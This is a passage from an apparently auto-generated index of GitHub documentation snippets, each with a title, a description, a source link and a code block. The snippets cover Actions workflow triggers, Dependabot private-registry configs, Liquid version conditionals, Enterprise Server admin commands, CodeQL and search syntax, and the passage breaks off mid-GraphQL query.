workflow to trigger only when a `push` event occurs on the `main` branch or any branch under the `releases/` directory. It utilizes the `branches` filter within the `push` event configuration.  The `on` keyword specifies the event that triggers the workflow.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/actions-filters.md#_snippet_0\n\nLANGUAGE: YAML\nCODE:\n```\non:\n  push:\n    branches:\n      - main\n      - 'releases/**'\n```\n\n----------------------------------------\n\nTITLE: Create Initial Commit\nDESCRIPTION: Creates an initial commit with a .gitignore file. This sets up the base state of the Git repository before adding any subtrees.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/using-git/about-git-subtree-merges.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\ntouch .gitignore\ngit add .gitignore\ngit commit -m \"initial commit\"\n```\n\n----------------------------------------\n\nTITLE: Maven pom.xml Configuration\nDESCRIPTION: This snippet shows a `pom.xml` file configuration for Maven, specifying the private registry URL within the `<repositories>` section. This ensures that Maven resolves dependencies from the specified private repository.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/maintain-dependencies/removing-dependabot-access-to-public-registries.md#_snippet_4\n\nLANGUAGE: xml\nCODE:\n```\n   <project>\n   ...\n    <repositories>\n     <repository>\n       <id>central</id>\n       <name>your custom repo</name>\n       <url>https://private_registry_url</url>\n    </repository>\n   ...\n   </project>\n```\n\n----------------------------------------\n\nTITLE: Resulting scoped registry in .npmrc\nDESCRIPTION: This snippet shows the resulting entry in the `.npmrc` file after configuring a scoped registry using the `npm config set` command.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/working-with-dependabot/guidance-for-the-configuration-of-private-registries-for-dependabot.md#_snippet_12\n\nLANGUAGE: text\nCODE:\n```\n@<org-name>:registry=https://<private-registry-url>\n```\n\n----------------------------------------\n\nTITLE: Specifying the Refresh Rate of the Migrations Visualizer (Shell)\nDESCRIPTION: Specifies the refresh rate of the migrations visualizer using the `-refresh_rate` option.  Replace `SECONDS` with the desired refresh rate in seconds.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_100\n\nLANGUAGE: shell\nCODE:\n```\nghe-migrations -refresh_rate SECONDS\n```\n\n----------------------------------------\n\nTITLE: Mapping CI_PIPELINE_SOURCE to GitHub Actions variable\nDESCRIPTION: Maps the GitLab CI environment variable `CI_PIPELINE_SOURCE` to the GitHub Actions equivalent `${{ github.event_name }}`. This indicates the event that triggered the workflow.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-gitlab-with-github-actions-importer.md#_snippet_33\n\nLANGUAGE: YAML\nCODE:\n```\n${{ github.event_name }}\n```\n\n----------------------------------------\n\nTITLE: Initializing Client ID Constant in Ruby\nDESCRIPTION: This snippet initializes the `CLIENT_ID` constant in `app_cli.rb` with the client ID of a {% data variables.product.prodname_github_app %}. It is essential for authenticating with the application.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-a-cli-with-a-github-app.md#_snippet_7\n\nLANGUAGE: ruby\nCODE:\n```\nCLIENT_ID=\"YOUR_CLIENT_ID\"\n```\n\n----------------------------------------\n\nTITLE: Defining a Callable Workflow\nDESCRIPTION: This YAML snippet defines a workflow that can be called by another workflow using the `workflow_call` event.  The `on: workflow_call` indicates that the workflow can be triggered by another workflow.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows.md#_snippet_51\n\nLANGUAGE: YAML\nCODE:\n```\non: workflow_call\n```\n\n----------------------------------------\n\nTITLE: Workflow Status Badge Markdown Example\nDESCRIPTION: This example demonstrates how to embed a workflow status badge in a `README.md` file using Markdown.  It assumes the workflow file is located at `.github/workflows/main.yml` in the `github/docs` repository.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/monitoring-and-troubleshooting-workflows/monitoring-workflows/adding-a-workflow-status-badge.md#_snippet_1\n\nLANGUAGE: Markdown\nCODE:\n```\n![example workflow](https://github.com/github/docs/actions/workflows/main.yml/badge.svg)\n```\n\n----------------------------------------\n\nTITLE: Placeholder Example - Markdown\nDESCRIPTION: This code demonstrates the correct way to format placeholders in markdown. Placeholders should be uppercase, kebab-case and documented inline\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/style-guide-and-content-model/style-guide.md#_snippet_27\n\nLANGUAGE: Markdown\nCODE:\n```\nIn the following example, replace YOUR-REPOSITORY with the name of your repository. `git init YOUR-REPOSITORY`\n```\n\nLANGUAGE: Markdown\nCODE:\n```\nClick **Add USERNAME.** Where USERNAME is the username of the person you want to add.\n```\n\n----------------------------------------\n\nTITLE: Making Ruby file executable\nDESCRIPTION: This command makes the Ruby script `app_cli.rb` executable by adding execute permissions for the user, group, and others.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-a-cli-with-a-github-app.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nchmod +x app_cli.rb\n```\n\n----------------------------------------\n\nTITLE: Running the whoami command in shell\nDESCRIPTION: This shell command executes the `app_cli.rb` script with the `whoami` argument.  It attempts to retrieve and display the username of the authenticated user.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-a-cli-with-a-github-app.md#_snippet_23\n\nLANGUAGE: shell\nCODE:\n```\n./app_cli.rb whoami\n```\n\n----------------------------------------\n\nTITLE: Conditional rendering with NOT EQUAL for GHES\nDESCRIPTION: This snippet checks if the GHES version is not equal to the last supported version and renders 'condition-j' if it is not.\nSOURCE: https://github.com/github/docs/blob/main/src/fixtures/fixtures/content/get-started/liquid/ifversion.md#_snippet_7\n\nLANGUAGE: Liquid\nCODE:\n```\n{% ifversion ghes != __GHES_SUPPORTED__[-1] %}\ncondition-j\n{% endif %}\n```\n\n----------------------------------------\n\nTITLE: Example web_config HTML output\nDESCRIPTION: This HTML snippet is an example of the output produced by the fish_config command showing the link to the web-based configuration interface.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/customizing-your-codespace/changing-the-shell-in-a-codespace.md#_snippet_7\n\nLANGUAGE: html\nCODE:\n```\n<body>\n  <p><a href=\"http://localhost:8000/1b9411c2469e392b96df5e5b28da485b/\">Start the Fish Web config</a></p>\n</body>\n```\n\n----------------------------------------\n\nTITLE: Define domains for Dependabot Updates\nDESCRIPTION: This domain is needed for Dependabot updates, which are used to keep dependencies up-to-date. This is conditionally included for FPT or GHEC.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/runner-essential-communications.md#_snippet_8\n\nLANGUAGE: shell\nCODE:\n```\ndependabot-actions.githubapp.com\n```\n\n----------------------------------------\n\nTITLE: SSH Connection to GitHub Enterprise Server\nDESCRIPTION: This command establishes an SSH connection to a GitHub Enterprise Server node. Replace HOSTNAME with the actual hostname of the node. The connection uses port 122 and the 'admin' user.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/enterprise_installation/ssh-into-cluster-node.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nssh -p 122 admin@HOSTNAME\n```\n\n----------------------------------------\n\nTITLE: Searching models by category on GitHub Marketplace\nDESCRIPTION: This snippet demonstrates how to search for models in the 'multilingual' category using the `category` qualifier. The search query filters models based on the specified category.\nSOURCE: https://github.com/github/docs/blob/main/content/search-github/searching-on-github/searching-github-models.md#_snippet_3\n\nLANGUAGE: URL\nCODE:\n```\nhttps://github.com/search?q=category:multilingual&type=marketplace\n```\n\n----------------------------------------\n\nTITLE: Triggering Workflow on Commit Status Change\nDESCRIPTION: This YAML snippet shows how to trigger a workflow when the status of a Git commit changes using the `status` event.  This workflow is triggered when a commit status changes.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows.md#_snippet_48\n\nLANGUAGE: YAML\nCODE:\n```\non:\n  status\n```\n\n----------------------------------------\n\nTITLE: Executing PHP server\nDESCRIPTION: This command starts a built-in PHP web server on localhost, port 8000. This is useful for testing the original PHP application.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/using-github-copilot/guides-on-using-github-copilot/using-copilot-to-migrate-a-project.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nphp -S localhost:8000\n```\n\n----------------------------------------\n\nTITLE: Travis CI Syntax for Environment Variable (YAML)\nDESCRIPTION: This YAML snippet shows how to define an environment variable in a Travis CI configuration file. It sets the `MAVEN_PATH` environment variable.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/manually-migrating-to-github-actions/migrating-from-travis-ci-to-github-actions.md#_snippet_12\n\nLANGUAGE: yaml\nCODE:\n```\nenv:\n  - MAVEN_PATH=\"/usr/local/maven\"\n```\n\n----------------------------------------\n\nTITLE: Configuring NuGet Feed with Username and Password\nDESCRIPTION: This snippet configures access to a NuGet feed using a username and password.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/working-with-dependabot/configuring-access-to-private-registries-for-dependabot.md#_snippet_13\n\nLANGUAGE: YAML\nCODE:\n```\nregistries:\n  nuget-example:\n    type: nuget-feed\n    url: https://nuget.example.com/v3/index.json\n    username: octocat@example.com\n    password: ${{secrets.MY_NUGET_PASSWORD}}\n```\n\n----------------------------------------\n\nTITLE: Conditional rendering for GHES version greater than a value\nDESCRIPTION: This snippet checks if the GHES version is greater than the first deprecated version and renders 'condition-f' if it is.\nSOURCE: https://github.com/github/docs/blob/main/src/fixtures/fixtures/content/get-started/liquid/ifversion.md#_snippet_3\n\nLANGUAGE: Liquid\nCODE:\n```\n{% ifversion ghes > __GHES_DEPRECATED__[0] %}\ncondition-f\n{% endif %}\n```\n\n----------------------------------------\n\nTITLE: Creating an issue programmatically\nDESCRIPTION: Creates a GitHub issue non-interactively using the `gh issue create` command. It specifies the title and body of the issue directly as arguments, avoiding prompts.\nSOURCE: https://github.com/github/docs/blob/main/content/github-cli/github-cli/creating-github-cli-extensions.md#_snippet_8\n\nLANGUAGE: Shell\nCODE:\n```\ngh issue create --title \"My Title\" --body \"Issue description\"\n```\n\n----------------------------------------\n\nTITLE: Triggering workflow on issue events\nDESCRIPTION: This code snippet shows how to trigger a GitHub Actions workflow when an issue is opened, edited, or milestoned in a repository. The `on` keyword specifies the `issues` event, and the `types` keyword filters for specific activity types: `opened`, `edited`, and `milestoned`.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows.md#_snippet_13\n\nLANGUAGE: yaml\nCODE:\n```\non:\n  issues:\n    types: [opened, edited, milestoned]\n```\n\n----------------------------------------\n\nTITLE: Searching by Sponsorability\nDESCRIPTION: This example shows how to search for users and organizations who can be sponsored on {% data variables.product.prodname_sponsors %} using the `is:sponsorable` qualifier. This is useful for identifying users who have a {% data variables.product.prodname_sponsors %} profile.\nSOURCE: https://github.com/github/docs/blob/main/content/search-github/searching-on-github/searching-users.md#_snippet_7\n\nLANGUAGE: none\nCODE:\n```\nis:sponsorable\n```\n\n----------------------------------------\n\nTITLE: Link Example in Docs\nDESCRIPTION: This example shows a link within the docs, that will be transformed when viewed on github.com or GHE Server. Specifically, the link is rewritten to include language and version codes depending on the environment it is being viewed in.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/writing-for-github-docs/using-markdown-and-liquid-in-github-docs.md#_snippet_25\n\nLANGUAGE: text\nCODE:\n```\n/github/writing-on-github/creating-a-saved-reply\n```\n\n----------------------------------------\n\nTITLE: HTTPS Script Tag in HTML\nDESCRIPTION: This HTML snippet demonstrates how to include a JavaScript file using HTTPS.  It is essential to update the `src` attribute from `http://` to `https://` to ensure secure delivery of the JavaScript file and avoid mixed content warnings.  This snippet is useful for updating existing HTML to enforce HTTPS.\nSOURCE: https://github.com/github/docs/blob/main/content/pages/getting-started-with-github-pages/securing-your-github-pages-site-with-https.md#_snippet_1\n\nLANGUAGE: html\nCODE:\n```\n<script type=\"text/javascript\" src=\"https://example.com/js/main.js\"></script>\n```\n\n----------------------------------------\n\nTITLE: Conditional Rendering with not and Nested ifversion\nDESCRIPTION: This snippet incorporates a `not` operator and nested `ifversion` statements. It checks if the GHES version is less than 2.16. If true, it renders 'Alpha'. Otherwise, it renders 'Charlie' and then checks if `fpt` is false and the GHES version is less than 2.14. If both these conditions are met, it renders 'Bravo'.\nSOURCE: https://github.com/github/docs/blob/main/src/ghes-releases/tests/fixtures/remove-liquid-statements/less-than-next-oldest.md#_snippet_5\n\nLANGUAGE: Liquid\nCODE:\n```\n{% ifversion ghes < 2.16 %}\n\nAlpha\n\n{% else %}\n\nCharlie\n\n{% ifversion not fpt and ghes < 2.14 %}\n\nBravo\n\n{% endif %}\n\n{% endif %}\n```\n\n----------------------------------------\n\nTITLE: Updating GitHub Enterprise Importer CLI Extension with gh\nDESCRIPTION: This command updates the GitHub Enterprise Importer (GEI) CLI extension. It uses the `gh extension upgrade` command to fetch and install the latest version from the `github/gh-gei` repository.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/enterprise-migration-tool/update-gei-cli.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\ngh extension upgrade github/gh-gei\n```\n\n----------------------------------------\n\nTITLE: Defining Update Groups with Patterns and Dependency Type in Dependabot\nDESCRIPTION: This YAML snippet configures Dependabot to create three groups of dependencies: `production-dependencies`, `development-dependencies`, and `rubocop`. It uses the `dependency-type` and `patterns` to include dependencies and `exclude-patterns` to exclude specific dependencies from certain groups. The configuration specifies weekly updates.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/dependabot/dependabot-version-updates-groups-yaml-example.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nversion: 2\nupdates:\n  # Keep bundler dependencies up to date\n  - package-ecosystem: \"bundler\"\n    directory: \"/\"\n    schedule:\n      interval: \"weekly\"\n    groups:\n      production-dependencies:\n        dependency-type: \"production\"\n      development-dependencies:\n        dependency-type: \"development\"\n        exclude-patterns:\n          - \"rubocop*\"\n      rubocop:\n        patterns:\n          - \"rubocop*\"\n```\n\n----------------------------------------\n\nTITLE: Excluding archived repositories using NOT is: qualifier\nDESCRIPTION: This snippet demonstrates how to exclude archived repositories from search results using the `NOT is:` qualifier.\nSOURCE: https://github.com/github/docs/blob/main/content/search-github/github-code-search/understanding-github-code-search-syntax.md#_snippet_25\n\nLANGUAGE: text\nCODE:\n```\nlog4j NOT is:archived\n```\n\n----------------------------------------\n\nTITLE: Verify Datastore Replication Status using ghe-repl-status\nDESCRIPTION: This command is used to check the status of each datastore's replication channel. It provides information about the health and synchronization status of the datastores.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/enterprise_installation/verify-replication-channel.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nghe-repl-status\n```\n\n----------------------------------------\n\nTITLE: Converting TLS key to PEM format (OpenSSL)\nDESCRIPTION: This snippet demonstrates how to convert a TLS key from DER format to PEM format using OpenSSL.  It utilizes the `openssl rsa` command with the `-inform` and `-outform` options to specify the input and output formats respectively. OpenSSL must be installed for this command to work.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/configuring-settings/hardening-security-for-your-enterprise/troubleshooting-tls-errors.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nopenssl rsa -in yourdomain.der -inform DER -out yourdomain.key -outform PEM\n```\n\n----------------------------------------\n\nTITLE: Defining Kubernetes Namespace Label in YAML\nDESCRIPTION: This YAML snippet shows how to add the `policy.sigstore.dev/include: \"true\"` label to a Kubernetes namespace's metadata, which enables enforcement of the GitHub artifact attestation policy in that namespace.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/security-for-github-actions/using-artifact-attestations/enforcing-artifact-attestations-with-a-kubernetes-admission-controller.md#_snippet_8\n\nLANGUAGE: yaml\nCODE:\n```\nmetadata:\n  labels:\n    policy.sigstore.dev/include: \"true\"\n```\n\n----------------------------------------\n\nTITLE: Linking to learning paths - Markdown\nDESCRIPTION: This snippet illustrates the format for linking to a learning path. Replace `LEARNING PATH TITLE` with the actual title of the learning path.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/style-guide-and-content-model/style-guide.md#_snippet_25\n\nLANGUAGE: Markdown\nCODE:\n```\nFor more information, follow the [LEARNING PATH TITLE](/) learning path.\n```\n\n----------------------------------------\n\nTITLE: Setting Environment Variables for PATs\nDESCRIPTION: These commands set environment variables for the GitHub Personal Access Token (`GH_PAT`) and the Azure DevOps Personal Access Token (`ADO_PAT`).  These tokens are used for authentication during the migration process. The first example uses `export` for bash-like terminals, and the second utilizes `$env` for PowerShell.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/using-github-enterprise-importer/migrating-from-azure-devops-to-github-enterprise-cloud/migrating-repositories-from-azure-devops-to-github-enterprise-cloud.md#_snippet_5\n\nLANGUAGE: shell\nCODE:\n```\nexport GH_PAT=\"TOKEN\"\nexport ADO_PAT=\"TOKEN\"\n```\n\nLANGUAGE: shell\nCODE:\n```\n$env:GH_PAT=\"TOKEN\"\n$env:ADO_PAT=\"TOKEN\"\n```\n\n----------------------------------------\n\nTITLE: Add Remote Repository\nDESCRIPTION: Adds a remote repository named 'spoon-knife' pointing to the specified GitHub URL. The '-f' option fetches the remote's branches and tags.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/using-git/about-git-subtree-merges.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\ngit remote add -f spoon-knife https://github.com/octocat/Spoon-Knife.git\n```\n\n----------------------------------------\n\nTITLE: Ensuring Unique Labels in Body of YAML\nDESCRIPTION: This snippet explains how to resolve the 'Body must have unique labels' error. This error occurs when multiple `body` elements that accept user input have the same `label` attribute. The fix involves ensuring each label is unique, or adding an `id` attribute to differentiate the elements if duplicate labels are required.\nSOURCE: https://github.com/github/docs/blob/main/content/communities/using-templates-to-encourage-useful-issues-and-pull-requests/common-validation-errors-when-creating-issue-forms.md#_snippet_6\n\nLANGUAGE: yaml\nCODE:\n```\nname: \"Bug report\"\nbody:\n- type: textarea\n  attributes:\n    label: Name\n- type: textarea\n  attributes:\n    label: Name\n\n```\n\nLANGUAGE: yaml\nCODE:\n```\nname: \"Bug report\"\nbody:\n- type: textarea\n  attributes:\n    label: Name\n- type: textarea\n  attributes:\n    label: Operating System\n\n```\n\nLANGUAGE: yaml\nCODE:\n```\nname: \"Bug report\"\nbody:\n- type: textarea\n  id: name_1\n  attributes:\n    label: Name\n- type: textarea\n  id: name_2\n  attributes:\n    label: Name\n\n```\n\n----------------------------------------\n\nTITLE: Specifying analysis results output format in CodeQL config - Shell\nDESCRIPTION: This snippet demonstrates how to specify the output format for analysis results generated by `codeql database analyze` in a CodeQL configuration file.  It ensures that only the `database analyze` command uses the `--format csv` option.  This configuration should be placed in the user's CodeQL configuration file.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/using-the-advanced-functionality-of-the-codeql-cli/specifying-command-options-in-a-codeql-configuration-file.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ndatabase analyze --format csv\n```\n\n----------------------------------------\n\nTITLE: Configuring NuGet Feed with Azure DevOps Token\nDESCRIPTION: This snippet configures access to a NuGet feed on Azure DevOps using a username and token.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/working-with-dependabot/configuring-access-to-private-registries-for-dependabot.md#_snippet_14\n\nLANGUAGE: YAML\nCODE:\n```\nregistries:\n  nuget-azure-devops:\n    type: nuget-feed\n    url: https://pkgs.dev.azure.com/.../_packaging/My_Feed/nuget/v3/index.json\n    username: octocat@example.com\n    password: ${{secrets.MY_AZURE_DEVOPS_TOKEN}}\n```\n\n----------------------------------------\n\nTITLE: Conditional Dependency Graph Availability Check (Liquid)\nDESCRIPTION: This Liquid code snippet conditionally displays information about the availability of the dependency graph based on the GitHub version. It checks for `fpt` or `ghec` and then displays the supported repository types for those versions. If neither of those are true it checks for `ghes` and displays dependency graph availability for all repositories in that case.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/gated-features/dependency-graph.md#_snippet_0\n\nLANGUAGE: liquid\nCODE:\n```\n{% ifversion fpt or ghec %}\n\nThe dependency graph is available for the following repository types:\n\n* Public repositories (on by default)\n* Private repositories\n* Forks\n\n{% elsif ghes %}\n\nThe dependency graph is available for all repositories.\n\n{% endif %}\n```\n\n----------------------------------------\n\nTITLE: Adding Context to a Base Rule's Error Message - JavaScript\nDESCRIPTION: This code snippet shows how to add context to the error message of a base rule (MD040, 'fenced-code-language') in `base.js`. The `context` property provides additional information to the user when the rule is violated, including allowed languages and instructions for updating the language list. It enhances the error message with specific details to aid in correction.\nSOURCE: https://github.com/github/docs/blob/main/src/content-linter/README.md#_snippet_3\n\nLANGUAGE: JavaScript\nCODE:\n```\n'fenced-code-language': {\n    // MD040\n    severity: 'error',\n    'partial-markdown-files': true,\n    'yml-files': true,\n    allowed_languages: allowedCodeFenceLanguages,\n    context: `When you add a fenced code block, you must specify the code language. Allowed languages are: ${allowedCodeFenceLanguages.join(', ')}. You can add allowed languages by updating data/code-languages.yml.`,\n  },\n```\n\n----------------------------------------\n\nTITLE: Defining License in qlpack.yml (YAML)\nDESCRIPTION: This snippet defines the license metadata for a CodeQL pack, which is displayed on the packaging search page. The `license` property specifies the SPDX license identifier, such as `MIT`.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/using-the-advanced-functionality-of-the-codeql-cli/publishing-and-using-codeql-packs.md#_snippet_17\n\nLANGUAGE: YAML\nCODE:\n```\nlicense: MIT\n```\n\n----------------------------------------\n\nTITLE: Searching models by category with spaces on GitHub Marketplace\nDESCRIPTION: This snippet demonstrates how to search for models in the 'large context' category using the `category` qualifier. Note the use of quotes around the category name since it contains spaces.\nSOURCE: https://github.com/github/docs/blob/main/content/search-github/searching-on-github/searching-github-models.md#_snippet_4\n\nLANGUAGE: URL\nCODE:\n```\nhttps://github.com/search?q=category:%22large+context%22+&type=marketplace\n```\n\n----------------------------------------\n\nTITLE: Conditional rendering for GHES version < 3.15\nDESCRIPTION: This code block conditionally renders content if the GitHub Enterprise Server version is less than 3.15. It serves as an outer condition for further checks related to feature flags.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/secret-scanning/beta-prs-discussions-wikis-scanned.md#_snippet_0\n\nLANGUAGE: Liquid\nCODE:\n```\n{% ifversion ghes < 3.15 %}\n{% ifversion secret-scanning-enhancements-prs-discussions %}\n\n> [!NOTE]\n> The scanning of content in pull requests and {% data variables.product.prodname_discussions %} is currently in {% data variables.release-phases.public_preview %} and subject to change.\n\n{% endif %}\n{% endif %}\n```\n\n----------------------------------------\n\nTITLE: Deleting an Item from a Project using GraphQL with curl\nDESCRIPTION: This snippet demonstrates deleting an item from a project using the GitHub GraphQL API and `curl`. It requires replacing `PROJECT_ID` and `ITEM_ID` with the appropriate values. The API key should be provided as a bearer token in the `Authorization` header.\nSOURCE: https://github.com/github/docs/blob/main/content/issues/planning-and-tracking-with-projects/automating-your-project/using-the-api-to-manage-projects.md#_snippet_27\n\nLANGUAGE: shell\nCODE:\n```\ncurl --request POST \\\n  --url https://api.github.com/graphql \\\n  --header 'Authorization: Bearer TOKEN' \\\n  --data '{\"query\":\"mutation {deleteProjectV2Item(input: {projectId: \\\"PROJECT_ID\\\" itemId: \\\"ITEM_ID\\\"}) {deletedItemId}}\"}'\n```\n\n----------------------------------------\n\nTITLE: Conditional rendering with OR for FPT and GHEC\nDESCRIPTION: This snippet checks if the current version is either FPT or GHEC and renders 'condition-l' if either condition is true.\nSOURCE: https://github.com/github/docs/blob/main/src/fixtures/fixtures/content/get-started/liquid/ifversion.md#_snippet_9\n\nLANGUAGE: Liquid\nCODE:\n```\n{% ifversion fpt or ghec %}\ncondition-l\n{% endif %}\n```\n\n----------------------------------------\n\nTITLE: Filtering repositories using is: qualifier\nDESCRIPTION: This snippet shows how to use the `is:` qualifier to filter search results based on repository properties like `archived`.  It filters for archived repositories.\nSOURCE: https://github.com/github/docs/blob/main/content/search-github/github-code-search/understanding-github-code-search-syntax.md#_snippet_24\n\nLANGUAGE: text\nCODE:\n```\npath:/^MIT.txt$/ is:archived\n```\n\n----------------------------------------\n\nTITLE: Configuration file for webhooks pipeline in JSON\nDESCRIPTION: This JSON file contains metadata used to configure the webhooks pipeline. Currently, it contains the SHA of the commit in the `github/rest-api-description` repository used to generate the data.\nSOURCE: https://github.com/github/docs/blob/main/src/webhooks/README.md#_snippet_3\n\nLANGUAGE: JSON\nCODE:\n```\nsrc/webhooks/lib/config.json\n```\n\n----------------------------------------\n\nTITLE: Searching models by language name on GitHub Marketplace\nDESCRIPTION: This snippet demonstrates how to search for models that support Arabic using the `language` qualifier with the language name ('arabic').\nSOURCE: https://github.com/github/docs/blob/main/content/search-github/searching-on-github/searching-github-models.md#_snippet_8\n\nLANGUAGE: URL\nCODE:\n```\nhttps://github.com/search?q=language:arabic&type=marketplace\n```\n\n----------------------------------------\n\nTITLE: Conditional rendering with EQUAL for GHES\nDESCRIPTION: This snippet checks if the GHES version is equal to the last supported version and renders 'condition-k' if it is.\nSOURCE: https://github.com/github/docs/blob/main/src/fixtures/fixtures/content/get-started/liquid/ifversion.md#_snippet_8\n\nLANGUAGE: Liquid\nCODE:\n```\n{% ifversion ghes = __GHES_SUPPORTED__[-1] %}\ncondition-k\n{% endif %}\n```\n\n----------------------------------------\n\nTITLE: Liquid conditional operator example for GHES version\nDESCRIPTION: Example usage of Liquid conditional operator to determine content displayed based on the GitHub Enterprise Server version.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/writing-for-github-docs/versioning-documentation.md#_snippet_7\n\nLANGUAGE: text\nCODE:\n```\n{% raw %}{% ifversion ghes > 2.21 and ghes < 3.1 %}{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Checking RubyGems Version\nDESCRIPTION: This command retrieves the currently installed version of RubyGems. RubyGems version 2.4.1 or higher is a prerequisite for using the GitHub Packages registry.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/working-with-a-github-packages-registry/working-with-the-rubygems-registry.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ngem --version\n```\n\n----------------------------------------\n\nTITLE: Create CodeQL pack configuration file\nDESCRIPTION: This YAML file defines a CodeQL pack, specifying its name and dependencies. It is used to group and manage CodeQL queries and libraries.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/using-the-advanced-functionality-of-the-codeql-cli/testing-custom-queries.md#_snippet_4\n\nLANGUAGE: yaml\nCODE:\n```\nname: my-custom-queries\ndependencies:\n  codeql/java-queries: \"*\"\n```\n\n----------------------------------------\n\nTITLE: Configuring Maven Repository\nDESCRIPTION: This snippet configures access to a private Maven repository using a username and password.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/working-with-dependabot/configuring-access-to-private-registries-for-dependabot.md#_snippet_10\n\nLANGUAGE: YAML\nCODE:\n```\nregistries:\n  maven-artifactory:\n    type: maven-repository\n    url: https://acme.jfrog.io/artifactory/my-maven-registry\n    username: octocat\n    password: ${{secrets.MY_ARTIFACTORY_PASSWORD}}\n```\n\n----------------------------------------\n\nTITLE: Adding Sinatra gem using Bundler\nDESCRIPTION: This command adds the Sinatra gem to the Gemfile and installs it. Sinatra is a Ruby web framework used to create web applications.\nSOURCE: https://github.com/github/docs/blob/main/content/webhooks/using-webhooks/handling-webhook-deliveries.md#_snippet_5\n\nLANGUAGE: Shell\nCODE:\n```\nbundle add sinatra\n```\n\n----------------------------------------\n\nTITLE: Importing GHES License from STDOUT\nDESCRIPTION: This command imports a GHES license from STDOUT using the `--pipe` option. It synchronizes the license after import.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_86\n\nLANGUAGE: shell\nCODE:\n```\ncat license | ghe-license import --pipe\n```\n\n----------------------------------------\n\nTITLE: Define domains for Package Management\nDESCRIPTION: These domains are needed for downloading or publishing packages and containers to GitHub Packages. Enables seamless package management within GitHub.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/runner-essential-communications.md#_snippet_6\n\nLANGUAGE: shell\nCODE:\n```\n*.pkg.github.com\npkg-containers.githubusercontent.com\nghcr.io\n```\n\n----------------------------------------\n\nTITLE: Running codeql generate extensible-predicate-metadata\nDESCRIPTION: This command reports extensible predicates found in the given pack. The pack root directory is required.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/codeql-cli-manual/generate-extensible-predicate-metadata.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ncodeql generate extensible-predicate-metadata <options>... -- <pack-root-dir>\n```\n\n----------------------------------------\n\nTITLE: Restoring EFI Boot Partition and Creating Fallback Partition\nDESCRIPTION: These commands restore the backed up EFI boot partition and create a fallback partition. Replace `/dev/xvdg2` and `/dev/xvdg4` with the actual device names.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/updating-the-virtual-machine-and-physical-resources/increasing-storage-capacity.md#_snippet_8\n\nLANGUAGE: Shell\nCODE:\n```\nsudo dd if=/dev/disk/by-label/EFIBOOT of=/dev/xvdg2 bs=1M\nsudo mkfs.ext4 -L fallback /dev/xvdg4\n```\n\n----------------------------------------\n\nTITLE: Querying Public Repositories by Organization with Enterprise Accounts API (GraphQL)\nDESCRIPTION: This GraphQL query retrieves the total number of public repositories in each organization within an enterprise account using the Enterprise Accounts API.  It requires the enterprise account's slug to be provided as a variable. Replace `<enterprise-account-name>` with the actual slug.\nSOURCE: https://github.com/github/docs/blob/main/content/graphql/guides/managing-enterprise-accounts.md#_snippet_0\n\nLANGUAGE: GraphQL\nCODE:\n```\nquery publicRepositoriesByOrganization($slug: String!) 